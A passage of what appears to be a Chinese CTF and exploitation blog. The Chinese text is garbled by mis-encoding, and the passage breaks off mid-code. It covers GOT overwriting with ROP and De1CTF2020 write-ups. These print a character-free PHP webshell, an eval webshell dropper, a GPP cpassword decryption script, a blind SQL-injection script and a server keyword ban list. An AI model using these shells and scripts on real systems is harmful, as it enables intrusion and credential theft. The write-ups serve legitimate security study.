Tableï¼‰ï¼Œç”¨æ¥å­˜å‚¨å¤–éƒ¨å‡½æ•°çš„å…¥å£ç‚¹ï¼ˆentryï¼‰ï¼Œæ¢è¨€ä¹‹ç¨‹åºæ€»ä¼šåˆ°PLTè¿™é‡Œå¯»æ‰¾å¤–éƒ¨å‡½æ•°çš„åœ°å€ã€‚PLTå­˜å‚¨åœ¨ä»£ç æ®µå†…ï¼Œåœ¨è¿è¡Œä¹‹å‰å°±å·²ç»ç¡®å®šå¹¶ä¸”ä¸ä¼šè¢«ä¿®æ”¹ï¼Œæ‰€ä»¥PLTå¹¶ä¸ä¼šçŸ¥é“ç¨‹åºè¿è¡Œæ—¶åŠ¨æ€é“¾æ¥åº“è¢«åŠ è½½çš„ç¡®åˆ‡ä½ç½®ã€‚é‚£ä¹ˆPLTè¡¨å†…å­˜å‚¨çš„å…¥å£ç‚¹æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ å°±æ˜¯GOTè¡¨ä¸­å¯¹åº”æ¡ç›®çš„åœ°å€ï¼š å¤–éƒ¨å‡½æ•°çš„å†…å­˜åœ°å€å­˜å‚¨åœ¨GOTè€ŒéPLTè¡¨å†…ï¼ŒPLTå­˜å‚¨çš„å…¥å£ç‚¹åˆæŒ‡å‘GOTçš„å¯¹åº”æ¡ç›®ï¼Œé‚£ä¹ˆç¨‹åºä¸ºä»€ä¹ˆé€‰æ‹©PLTè€ŒéGOTä½œä¸ºè°ƒç”¨çš„å…¥å£ç‚¹å‘¢ï¼Ÿè¿™æ ·çš„è®¾è®¡æ˜¯ä¸ºäº†ç¨‹åºçš„è¿è¡Œæ•ˆç‡ã€‚GOTè¡¨çš„åˆå§‹å€¼éƒ½æŒ‡å‘PLTè¡¨å¯¹åº”æ¡ç›®ä¸­çš„æŸä¸ªç‰‡æ®µï¼Œè¿™ä¸ªç‰‡æ®µçš„ä½œç”¨æ˜¯è°ƒç”¨ä¸€ä¸ªå‡½æ•°åœ°å€è§£æå‡½æ•°ã€‚å½“ç¨‹åºéœ€è¦è°ƒç”¨æŸä¸ªå¤–éƒ¨å‡½æ•°æ—¶ï¼Œé¦–å…ˆåˆ°PLTè¡¨å†…å¯»æ‰¾å¯¹åº”çš„å…¥å£ç‚¹ï¼Œè·³è½¬åˆ°GOTè¡¨ä¸­ã€‚å¦‚æœè¿™æ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨è¿™ä¸ªå‡½æ•°ï¼Œç¨‹åºä¼šé€šè¿‡GOTè¡¨å†æ¬¡è·³è½¬å›PLTè¡¨ï¼Œè¿è¡Œåœ°å€è§£æç¨‹åºæ¥ç¡®å®šå‡½æ•°çš„ç¡®åˆ‡åœ°å€ï¼Œå¹¶ç”¨å…¶è¦†ç›–æ‰GOTè¡¨çš„åˆå§‹å€¼ï¼Œä¹‹åå†æ‰§è¡Œå‡½æ•°è°ƒç”¨ã€‚å½“å†æ¬¡è°ƒç”¨è¿™ä¸ªå‡½æ•°æ—¶ï¼Œç¨‹åºä»ç„¶é¦–å…ˆé€šè¿‡PLTè¡¨è·³è½¬åˆ°GOTè¡¨ï¼Œæ­¤æ—¶GOTè¡¨å·²ç»å­˜æœ‰è·å–å‡½æ•°çš„å†…å­˜åœ°å€ï¼Œæ‰€ä»¥ä¼šç›´æ¥è·³è½¬åˆ°å‡½æ•°æ‰€åœ¨åœ°å€æ‰§è¡Œå‡½æ•°ã€‚ ç¬¬ä¸€æ¬¡è°ƒç”¨æ•´ä¸ªè¿‡ç¨‹å¦‚ä¸‹ï¼š ç¬¬äºŒæ¬¡è°ƒç”¨æ•´ä¸ªè¿‡ç¨‹å¦‚ä¸‹ï¼š ä¸Šè¿°å®ç°éµå¾ªçš„æ˜¯ä¸€ç§è¢«ç§°ä¸ºLAZYçš„è®¾è®¡æ€æƒ³ï¼Œå®ƒå°†éœ€è¦å®Œæˆçš„æ“ä½œï¼ˆè§£æå¤–éƒ¨å‡½æ•°çš„å†…å­˜åœ°å€ï¼‰ç•™åˆ°è°ƒç”¨å®é™…å‘ç”Ÿæ—¶æ‰è¿›è¡Œï¼Œè€Œéåœ¨ç¨‹åºä¸€å¼€å§‹è¿è¡Œæ—¶å°±è§£æå‡ºå…¨éƒ¨å‡½æ•°åœ°å€ã€‚ è¿™ä¸ªè¿‡ç¨‹ä¹Ÿå¯ç¤ºäº†æˆ‘ä»¬å¦‚ä½•å®ç°å‡½æ•°çš„ä¼ªè£…ï¼Œé‚£å°±æ˜¯åˆ°GOTè¡¨ä¸­å°†å‡½æ•°Açš„åœ°å€ä¿®æ”¹ä¸ºå‡½æ•°Bçš„åœ°å€ã€‚è¿™æ ·åœ¨åé¢æ‰€æœ‰å¯¹å‡½æ•°Açš„è°ƒç”¨éƒ½ä¼šæ‰§è¡Œå‡½æ•°Bã€‚é‚£ä¹ˆæˆ‘ä»¬çš„ç›®æ ‡å¯ä»¥åˆ†è§£ä¸ºå¦‚ä¸‹å‡ éƒ¨åˆ†ï¼šç¡®å®šå‡½æ•°Aåœ¨GOTè¡¨ä¸­çš„æ¡ç›®ä½ç½®ï¼Œç¡®å®šå‡½æ•°Båœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Œå°†å‡½æ•°Bçš„åœ°å€å†™å…¥å‡½æ•°Aåœ¨GOTè¡¨ä¸­çš„æ¡ç›®ã€‚ 1ã€å¦‚ä½•ç¡®å®šå‡½æ•°Aåœ¨GOTè¡¨ä¸­çš„æ¡ç›®ä½ç½®ï¼Ÿ ç¨‹åºè°ƒç”¨å‡½æ•°æ—¶æ˜¯é€šè¿‡PLTè¡¨è·³è½¬åˆ°GOTè¡¨çš„å¯¹åº”æ¡ç›®ï¼Œæ‰€ä»¥å¯ä»¥åœ¨å‡½æ•°è°ƒç”¨çš„æ±‡ç¼–æŒ‡ä»¤ä¸­æ‰¾åˆ°PLTè¡¨ä¸­è¯¥å‡½æ•°çš„å…¥å£ç‚¹ä½ç½®ï¼Œä»è€Œå®šä½åˆ°è¯¥å‡½æ•°åœ¨GOTä¸­çš„æ¡ç›®ã€‚ä¾‹å¦‚ï¼š call 0x08048430 &lt;printf@plt&gt; å°±è¯´æ˜printfåœ¨PLTè¡¨ä¸­çš„å…¥å£ç‚¹æ˜¯åœ¨0x08048430ï¼Œæ‰€ä»¥0x08048430å¤„å­˜å‚¨çš„å°±æ˜¯GOTè¡¨ä¸­printfçš„æ¡ç›®åœ°å€ã€‚ 2ã€å¦‚ä½•ç¡®å®šå‡½æ•°Båœ¨å†…å­˜ä¸­çš„åœ°å€ï¼Ÿ å¦‚æœç³»ç»Ÿå¼€å¯äº†å†…å­˜å¸ƒå±€éšæœºåŒ–ï¼Œç¨‹åºæ¯æ¬¡è¿è¡ŒåŠ¨æ€é“¾æ¥åº“çš„åŠ è½½ä½ç½®éƒ½æ˜¯éšæœºçš„ï¼Œå°±å¾ˆéš¾é€šè¿‡è°ƒè¯•å·¥å…·ç›´æ¥ç¡®å®šå‡½æ•°çš„åœ°å€ã€‚å‡å¦‚å‡½æ•°Båœ¨æ ˆæº¢å‡ºä¹‹å‰å·²ç»è¢«è°ƒç”¨è¿‡ï¼Œæˆ‘ä»¬å½“ç„¶å¯ä»¥é€šè¿‡å‰ä¸€ä¸ªé—®é¢˜çš„ç­”æ¡ˆæ¥è·å¾—åœ°å€ã€‚ä½†æˆ‘ä»¬å¿ƒä»ªçš„æ”»å‡»å‡½æ•°å¾€å¾€å¹¶ä¸æ»¡è¶³è¢«è°ƒç”¨è¿‡çš„è¦æ±‚ï¼Œä¹Ÿå°±æ˜¯GOTè¡¨ä¸­å¹¶æ²¡æœ‰å…¶çœŸå®çš„å†…å­˜åœ°å€ã€‚å¹¸è¿çš„æ˜¯ï¼Œå‡½æ•°åœ¨åŠ¨æ€é“¾æ¥åº“å†…çš„ç›¸å¯¹ä½ç½®æ˜¯å›ºå®šçš„ï¼Œåœ¨åŠ¨æ€åº“æ‰“åŒ…ç”Ÿæˆæ—¶å°±å·²ç»ç¡®å®šã€‚æ‰€ä»¥å‡å¦‚æˆ‘ä»¬çŸ¥é“äº†å‡½æ•°Açš„è¿è¡Œæ—¶åœ°å€ï¼ˆè¯»å– GOT è¡¨å†…å®¹ï¼‰ï¼Œä¹ŸçŸ¥é“å‡½æ•°Aå’Œå‡½æ•°Båœ¨åŠ¨æ€é“¾æ¥åº“å†…çš„ç›¸å¯¹ä½ç½®ï¼Œå°±å¯ä»¥æ¨ç®—å‡ºå‡½æ•°Bçš„è¿è¡Œæ—¶åœ°å€ã€‚ 3ã€å¦‚ä½•å®ç° GOT è¡¨ä¸­æ•°æ®çš„ä¿®æ”¹ï¼Ÿ å¾ˆéš¾æ‰¾åˆ°åˆé€‚çš„å‡½æ•°æ¥å®Œæˆè¿™ä¸€ä»»åŠ¡ï¼Œä¸è¿‡æˆ‘ä»¬è¿˜æœ‰å¼ºå¤§çš„ROPã€‚å‡è®¾æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä»¥ä¸‹è‹¥å¹²æ¡gadgetï¼Œå°±ä¸éš¾æ”¹å†™GOTè¡¨ä¸­æ•°æ®ï¼Œä»è€Œå®ç°å‡½æ•°çš„ä¼ªè£…ã€‚ pop eax; ret; # printf@plt -&gt; eaxmov ebx [eax]; ret; # printf@got -&gt; ebxpop ecx; ret; # addr_diff = system - printf -&gt; ecxadd [ebx] ecx; ret; # printf@got += addr_diff ä»ä¿®æ”¹GOTè¡¨çš„è¿‡ç¨‹å¯ä»¥çœ‹å‡ºï¼Œè¿™ç§æ–¹æ³•ä¹Ÿå¯ä»¥åœ¨ä¸€å®šç¨‹åº¦ä¸Šç»•è¿‡å†…å­˜éšæœºåŒ–ã€‚ å››ç§å¸¸è§çš„æ–¹æ³•å­¦ä¹ å®Œæ¯•ï¼Œè¿˜å¾—å¤šåŠ¨æ‰‹å®è·µæ‰å¥½ï¼Œä»¥ä¸Šå†…å®¹å‡å‚è€ƒé•¿äº­å¸ˆå‚…ä»¬çš„æ–‡ç« ï¼Œæœ¬æ–‡åªæ˜¯è®°å½•å­¦ä¹ ç”¨ã€‚","link":"/2020/05/13/%E5%85%A5%E5%9D%91%E4%BA%8C%E8%BF%9B%E5%88%B6/"},{"title":"De1CTF2020éƒ¨åˆ†é¢˜è§£","text":"è¿™ä¸ªæ¯”èµ›å¤ªè€ƒå·¥ä½œé‡ï¼Œä¸ªäººæ„Ÿè§‰çŸ¥è¯†é‡ä¹Ÿæ¯”è¾ƒå¤§ï¼Œå¦å¤–De1taçš„å¸ˆå‚…ä»¬åŸæ¥è¿™ä¹ˆçˆ±ç©MCå•ŠğŸ¤”ï¼Œå†™ä¸€ä¸‹å‡ ä¸ªé¢˜çš„é¢˜è§£ï¼Œä¸»è¦è®°å½•ä¸€ä¸‹å­¦åˆ°çš„ä¸œè¥¿ã€‚ check inè€ƒå¯Ÿä¸Šä¼ ç»•è¿‡ï¼Œä¸€æ˜¯åœ¨ä¸Šä¼ .htaccessæ—¶å¯¹å…³é”®å­—è¿›è¡Œç»•è¿‡ï¼ŒäºŒæ˜¯åœ¨ä¼ é©¬æ—¶å¯¹&lt;?phpè¿›è¡Œç»•è¿‡ è§£é¢˜æ‰“å¼€é¢˜ç›®ï¼Œéšä¾¿ä¸Šä¼ ä¸ªphpçš„å°é©¬ï¼Œå›æ˜¾å¦‚ä¸‹ï¼š phpçš„åç¼€æ—¢ç„¶ä¸è¡Œï¼Œé‚£åº”è¯¥å°±æ˜¯å›¾ç‰‡é©¬äº†ï¼Œå…«æˆæ˜¯è¦ç”¨.htaccessè§£æï¼Œçœ‹ä¸€ä¸‹å“åº”å¤´ä¸­æœåŠ¡å™¨çš„æ¶æ„ï¼šApache/2.4.6 (CentOS) PHP/5.4.16ï¼ŒåŸºæœ¬æ˜¯ç¡®å®æ˜¯ä¼ .htaccessäº† æ„é€ .htaccesså°†jpgè¿›è¡Œè§£æï¼š AddType application/x-httpd-php .jpg ä¸Šä¼ ä¹‹åå›æ˜¾å¦‚ä¸‹ï¼š perl|pyth|ph|auto|curl|base|&gt;|rm|ruby|openssl|war|lua|msf|xter|telnet è¿™äº›å­—æ®µè¢«banäº†ï¼Œä¸è¿‡.htaccessä¸­å¯ä»¥ç”¨pythonæ¢è¡Œæ—¶å€™ä¸€ç§è§£æè¯­æ³•ï¼š AddType application/x-httpd-p\\hp .jpg ä¸Šä¼ çš„æ—¶å€™æ³¨æ„æ”¹Content-Typeï¼Œå¦‚å›¾ï¼š å¦‚æ­¤ä¾¿å¯ä»¥æˆåŠŸä¸Šä¼ ï¼Œç„¶åä¼ jpgçš„å›¾ç‰‡é©¬å°±è¡Œäº†ï¼Œæ³¨æ„å›¾ç‰‡é©¬é‡Œçš„&lt;?phpæ ‡ç­¾ä¹Ÿéœ€è¦ç»•è¿‡ï¼Œå¯ä»¥ç”¨&lt;?=ï¼Œå¦‚ä¸‹å›¾ï¼š ä¸Šä¼ å°é©¬ä¹‹åï¼Œæ‹¿åˆ°æ–‡ä»¶è·¯å¾„ï¼Œä¼ system(&quot;cat /flag&quot;);å³å¯æ‹¿åˆ°flagã€‚ Hard_present_1è€ƒå¯Ÿæ–‡ä»¶ä¸Šä¼ åˆ©ç”¨NTFSæµç»•è¿‡æ–‡ä»¶åæ£€æµ‹ã€æ— å­—æ¯æ•°å­—shellæ„é€ ã€åŸŸæ¸—é€ é¢˜ç›®åˆ†æè¿›å…¥é¢˜ç›®ï¼Œç»™å‡ºå¦‚ä¸‹æºç ï¼š &lt;?php//Clear the uploads directory every hourhighlight_file(__FILE__);$sandbox = \"uploads/\". md5(\"De1CTF2020\".$_SERVER['REMOTE_ADDR']);@mkdir($sandbox);@chdir($sandbox);if($_POST[\"submit\"]){ if (($_FILES[\"file\"][\"size\"] &lt; 2048) &amp;&amp; Check()){ if ($_FILES[\"file\"][\"error\"] &gt; 0){ die($_FILES[\"file\"][\"error\"]); } else{ $filename=md5($_SERVER['REMOTE_ADDR']).\"_\".$_FILES[\"file\"][\"name\"]; move_uploaded_file($_FILES[\"file\"][\"tmp_name\"], $filename); echo \"save in:\" . $sandbox.\"/\" . $filename; } } else{ echo \"Not Allow!\"; }}function Check(){ $BlackExts = array(\"php\"); $ext = explode(\".\", $_FILES[\"file\"][\"name\"]); $exts = trim(end($ext)); $file_content = file_get_contents($_FILES[\"file\"][\"tmp_name\"]); if(!preg_match('/[a-z0-9;~^`&amp;|]/is',$file_content) &amp;&amp; !in_array($exts, $BlackExts) &amp;&amp; !preg_match('/\\.\\./',$_FILES[\"file\"][\"name\"])) { return true; } return false;}?&gt; å®¡è®¡ä¸€ä¸‹å‘ç°æ–‡ä»¶åå¤„æœ‰è¿‡æ»¤ï¼Œå¹¶ä¸”ä¸Šä¼ çš„æ–‡ä»¶ä¸­ä¸èƒ½åŒ…å«æ•°å­—ã€å°å†™å­—æ¯ã€;ã€~ã€^ã€&amp;ã€|ã€åå¼•å·ç­‰ï¼Œæ ¹æ®è¿™ä¸ªè§„åˆ™ï¼Œè‚¯å®šéœ€è¦æ„é€ æ— æ•°å­—å­—æ¯çš„shelläº†ï¼Œä¹‹å‰çœ‹è¿‡pç¥çš„ä¸€ç¯‡æ–‡ç« è®²è¿‡ï¼Œä¸è¿‡è¿™é‡Œç”±äºï¼›ä¹Ÿè¢«è¿‡æ»¤ï¼Œéœ€è¦ç”¨çŸ­æ ‡ç­¾æ¥ç»•è¿‡ã€‚ BPæŠ“åŒ…å‘ç°æœåŠ¡å™¨æ˜¯Windows serverï¼Œè¿™ç§æƒ…å†µä¸‹çš„æ–‡ä»¶ä¸Šä¼ å¯ä»¥åˆ©ç”¨NTFSçš„DATAç‰¹æ€§è¿›è¡Œç»•è¿‡ï¼Œå‚è€ƒè¿™é‡Œç”¨NTFSç‰¹æ€§å’Œæ— æ•°å­—å­—æ¯shellç»•è¿‡é™åˆ¶ä¸Šä¼ ï¼Œç»„ç­–ç•¥æ³„éœ²å¯†ç ã€‚ æˆåŠŸæ‹¿åˆ°shellä¹‹åï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰¾åˆ°äº†flagçš„å‹ç¼©åŒ…ï¼Œè§£å‹éœ€è¦å¯†ç ï¼Œè¿™é‡Œè€ƒäº†ä¸€ç§åŸŸæ¸—é€ï¼Œåˆ©ç”¨SYSVOLè¿˜åŸç»„ç­–ç•¥ä¸­ä¿å­˜çš„å¯†ç ï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç« ã€‚ è§£é¢˜æ€è·¯å¾ˆæ˜ç¡®äº†ï¼šåˆ©ç”¨NTFSç‰¹æ€§å’Œæ— æ•°å­—å­—æ¯shellç»•è¿‡é™åˆ¶ä¸Šä¼ ï¼Œç»„ç­–ç•¥æ³„éœ²å¯†ç ã€‚ è§£é¢˜ç»“åˆpç¥é‚£ç¯‡æ–‡ç« é‡Œç»™å‡ºçš„shellæ„é€ æ–¹æ³•ï¼Œå¯¹å…¶è¿›è¡ŒçŸ­æ ‡ç­¾æ‹¼æ¥ä¹‹åï¼Œshellè„šæœ¬å¦‚ä¸‹ï¼ˆç”±hpdogerå¸ˆå‚…æä¾›ï¼‰ï¼š &lt;?=$_=[]?&gt;&lt;?=$_=@\"$_\"?&gt;&lt;?=$_=$_['!'=='@']?&gt;&lt;?=$__=$_?&gt;&lt;?=$____='_'?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt; //S&lt;?=$___=$__?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt; //SY&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt; //SYS&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt; //SYST&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt; //SYSTE&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$___.=$__?&gt; //SYSTEM&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt; //_P&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt; //_PO&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt; //_POS&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____.=$__?&gt; //_POST&lt;?=$_=$$____?&gt;&lt;?=$___($_[_])?&gt;//system($_POST[_]) //ç”¨çš„æ—¶å€™æ³¨é‡Šè¦å»æ‰ éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼šassertå’Œevalåœ¨php7.2ä¸å±äºå‡½æ•°ï¼Œå› æ­¤æ„é€ systemã€‚ åˆ©ç”¨NTFSçš„DATAç‰¹æ€§ç»•è¿‡è¿‡æ»¤ä¸Šä¼ å°é©¬ï¼ŒæˆåŠŸæ‹¿åˆ°shellï¼š åˆ©ç”¨è¿™ä¸ªshellï¼Œå†ä¼ ä¸€ä¸ªæ™®é€šshellä¸Šå»ï¼š _=echo ^&lt;?php eval($_POST[a]); &gt; ma.php æŸ¥çœ‹ä¸€ä¸‹æ˜¯å¦æˆåŠŸå†™å…¥ï¼š æˆåŠŸå†™å…¥æ™®é€šshellï¼Œèšå‰‘è¿æ¥å³å¯ï¼Œåœ¨Hintç›®å½•ä¸‹å‘ç°ç–‘ä¼¼flagçš„å‹ç¼©åŒ…ï¼š å‹ç¼©åŒ…ä¸‹è½½å‡ºæ¥ä¹‹åéœ€è¦å¯†ç ï¼Œç»ˆç«¯net user /domainçœ‹åˆ°å­˜åœ¨HintZip_Passç”¨æˆ·ï¼Œæ˜¾ç„¶ï¼Œè¿™ä¸ªç”¨æˆ·å¯†ç åº”è¯¥å°±æ˜¯å‹ç¼©åŒ…çš„å¯†ç äº†ï¼Œä¸‹é¢å°±éœ€è¦è¿›è¡ŒåŸŸæ¸—é€äº†ã€‚ ç»ˆç«¯net useè·å–åˆ°å¦‚ä¸‹ä¿¡æ¯ï¼š çœ‹åˆ°SYSVOLç»„ç­–ç•¥çš„å­˜åœ¨ï¼Œè¯»å–å…¶Groups.xmlï¼Œå†…å®¹å¦‚ä¸‹ï¼š &lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"&gt;&lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"HintZip_Pass\" image=\"2\" changed=\"2020-04-15 14:43:23\" uid=\"{D33537C1-0BDB-44B7-8628-A6030A298430}\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08\" changeLogon=\"1\" noChange=\"0\" neverExpires=\"0\" acctDisabled=\"0\" userName=\"HintZip_Pass\"/&gt;&lt;/User&gt;&lt;/Groups&gt; å…¶ä¸­çš„cpassword=&quot;uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08&quot;å°±æ˜¯è¯¥ç”¨æˆ·çš„å¯†ç ï¼Œä¸è¿‡æ˜¯ç»è¿‡AESåŠ å¯†çš„ï¼Œå‚è€ƒåŸŸæ¸—é€é‚£ç¯‡æ–‡ç« é‡Œçš„è§£å¯†psè„šæœ¬ï¼š function Get-DecryptedCpassword { [CmdletBinding()] Param ( [string] $Cpassword ) try { #Append appropriate padding based on string length $Mod = ($Cpassword.length % 4) switch ($Mod) { '1' {$Cpassword = $Cpassword.Substring(0,$Cpassword.Length -1)} '2' {$Cpassword += ('=' * (4 - $Mod))} '3' {$Cpassword += ('=' * (4 - $Mod))} } $Base64Decoded = [Convert]::FromBase64String($Cpassword) #Create a new AES .NET Crypto Object $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider [Byte[]] $AesKey = @(0x4e,0x99,0x06,0xe8,0xfc,0xb6,0x6c,0xc9,0xfa,0xf4,0x93,0x10,0x62,0x0f,0xfe,0xe8, 0xf4,0x96,0xe8,0x06,0xcc,0x05,0x79,0x90,0x20,0x9b,0x09,0xa4,0x33,0xb6,0x6c,0x1b) #Set IV to all nulls to prevent dynamic generation of IV value $AesIV = New-Object Byte[]($AesObject.IV.Length) $AesObject.IV = $AesIV $AesObject.Key = $AesKey $DecryptorObject = $AesObject.CreateDecryptor() [Byte[]] $OutBlock = $DecryptorObject.TransformFinalBlock($Base64Decoded, 0, $Base64Decoded.length) return [System.Text.UnicodeEncoding]::Unicode.GetString($OutBlock) } catch {Write-Error $Error[0]}} Get-DecryptedCpassword \"uYgjj9DCKSxqUp7gZfYzo0F6hOyiYh4VmYBXRAUp+08\" æˆ–è€…åˆ°è¿™é‡Œä¸‹è½½å¼€æºçš„è§£å¯†è„šæœ¬ ç”¨å‘½ä»¤è·‘è§£å¯†è„šæœ¬powershell.exe -executionpolicy bypass -file get-DecryptedCpassword.ps1 æˆåŠŸæ‹¿åˆ°å¯†ç ï¼Œè§£å¯†å³å¯æ‹¿åˆ°flagä»¥åŠä¸‹ä¸€é¢˜çš„æç¤ºï¼š flag1: De1CTF{GpP_11Is_SoOOO_Ea3333y}Get flag2 Hint:hint1: You need De1ta user to get flag2hint2: De1ta user's password length is 1-8, and the password is composed of [0-9a-f].hint3: Pay attention to the extended rights of De1ta user on the domain.hint4: flag2 in Domain Controller (C:\\Users\\Administrator\\Desktop\\flag.txt)PS: Please do not damage the environment after getting permission, thanks QAQ. è¿™é“é¢˜å­¦ä¼šäº†ä¸å°‘ï¼ŒWindows Serverä¸‹çš„NTFSæ–‡ä»¶ä¸Šä¼ ç»•è¿‡ã€åŸŸæ¸—é€ï¼Œåœ¨ä¹‹å‰åšè¿‡çš„é¢˜é‡Œå¾ˆå°‘è§ã€‚ Hard_Pentest_2åŸŸæ¸—é€-åˆ©ç”¨èµ„æºçº¦æŸå§”æ´¾è¿›è¡Œææƒ Mixtureä¸€é“web+pwné¢˜ï¼Œè¿™é¢˜æ˜¯é˜Ÿé‡Œçš„å¤§å¸ˆå‚…ä»¬åšçš„ï¼Œæˆ‘å°±æ‘¸é±¼å·å­¦ç‚¹çŸ¥è¯†ã€‚ è§£é¢˜é¦–å…ˆåˆ©ç”¨benchmarkæ³¨å‡ºadminçš„å¯†ç ï¼Œä»å¸ˆå‚…é‚£é‡Œæ¼‚åˆ°è„šæœ¬å­¦ä¹ äº†ä¸€ç•ªï¼š #coding:utf-8import requests#select group_concat(SCHEMA_NAME) from information_schema.SCHEMATA#select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = 'test'#select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_SCHEMA = 'xxx' and TABLE_NAME = 'xxx'string = ''session = requests.Session()headers= { \"Cookie\":\"PHPSESSID=g6u5esdng9h7a2ei3m93srf0mp\"}for i in range(1,100): for j in range(32,128): # print(j) url = \"http://134.175.185.244/member.php?orderby=,ISNULL(CASE WHEN (ascii(substr((select password from member where id=1),{0},1))={1}) THEN BENCHMARK(2000000,SHA1(123)) ELSE 2 END)\".format(i,j) r=session.get(url,headers = headers,cookies = cookies) # print(url) sec=r.elapsed.seconds if sec &gt; 3: string += chr(j) print(chr(j)) breakprint(string) åé¢å‘ç°æœ‰ä¸ªMinincludeï¼Œåé¢å°±æ˜¯pwnçš„äº†ï¼Œä»å¤§å¸ˆå‚…é‚£é‡Œæ‹¿åˆ°çš„æºç ï¼Œä»”ç»†è¯»è¯»ï¼ŒçœŸçš„ä¸ä¼šâ€¦ #encoding:utf-8import requestsimport sysimport osfrom pwn import *from Crypto.Util.number import 